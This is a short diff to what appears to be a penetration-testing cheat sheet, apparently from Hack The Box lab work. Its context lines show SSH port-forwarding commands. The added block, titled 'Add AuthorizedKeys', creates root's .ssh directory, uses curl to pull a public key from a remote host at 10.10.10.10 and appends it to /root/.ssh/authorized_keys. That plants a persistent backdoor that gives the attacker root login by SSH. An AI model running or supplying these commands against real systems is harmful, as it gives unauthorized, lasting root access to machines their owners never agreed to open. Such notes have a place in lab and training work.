@@ -31,3 +31,12 @@ proxy through remote host:
 ssh -i key -L8000:10.10.10.1:80 10.10.10.2
 ssh -i key -L8000:proxy:80 target
 ```
+
+Add AuthorizedKeys:
+
+```bash
+mkdir /root/.ssh/
+chmod 600 /root/.ssh
+curl 10.10.10.10/rsa/htb_rsa.pub >>  /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+```
